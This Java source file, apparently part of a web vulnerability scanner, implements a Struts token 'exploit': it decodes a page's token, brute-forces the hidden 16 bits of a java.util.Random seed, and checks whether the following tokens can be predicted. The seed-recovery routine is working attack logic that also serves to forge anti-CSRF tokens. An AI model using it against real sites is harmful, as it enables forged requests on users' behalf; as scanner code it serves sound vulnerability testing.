package com.shaobing.wallaby.core.jscan.apache.strutstoken;

/**
 * Struts token 破解
 *
 * @author luyb@servyou.com.cn
 * @version $Id: StrutsTokenExploit.java v 0.1 2016/12/31 22:55 luyb Exp $$
 */
public class StrutsTokenExploit {

    /** 线性同余常量A*/
    private static final long multiplier = 0x5DEECE66DL;

    /** 线性同于常量B */
    private static final long addend     = 0xBL;

    /** 线性同于常量C, 取模(%)操作可以转换成与(&)操作*/
    private static final long mask       = (1L << 48) - 1;

    /**
     * 检查token是否可预测
     *
     * @param token 页面上获取的token
     * @return  boolean
     */
    public boolean checkToken(String token) {
        return findNextToken(token);
    }

    /**
     * 寻找下一个token
     *
     * @param token
     */
    private boolean findNextToken(String token) {
        int[] tokenInts = ByteUtils.bytesToInt(ByteUtils.bigIntToByte(token, 36));
        long seed = findSeed(reverseByteOrder(tokenInts[1]), reverseByteOrder(tokenInts[2]));
        ReplayRandom random = new ReplayRandom(seed);

        int[] nextInts = new int[4];
        for(int i=0;i<nextInts.length;i++) {
            nextInts[i] = reverseByteOrder(random.nextInt());
        }

        boolean match1 = tokenInts[2] == nextInts[0];
        boolean match2 = tokenInts[3] == nextInts[1];
        boolean match3 = tokenInts[4] == nextInts[2];

        return match1 && match2 && match3;
    }

    private long findSeed(long v1, long v2) {
        v1 = v1 & 0xFFFFFFFFL;
        v2 = v2 & 0xFFFFFFFFL;

        //Brute for the 16 bit that is unknown (48 bits seed - 32 bits return value = 16 bits)
        for (int i = 0; i < 0x10000; i++) {
            long seed = (v1 << 16) + i;
            if ((((seed * multiplier + addend) & mask) >>> 16) == v2) {
                System.out.println("Seed found: " + seed);
                return seed;
            }
        }
        return -1;
    }

    /**
     * 倒序字节
     *
     * @param value
     * @return  int
     */
    public static int reverseByteOrder(long value) {
        int reverseValue = 0x00000000;

        reverseValue |= value << 24 & 0xFF000000;
        reverseValue |= value << 8 & 0xFF0000;
        reverseValue |= value >> 8 & 0xFF00;
        reverseValue |= value >> 24 & 0xFF;

        return reverseValue;
    }

}
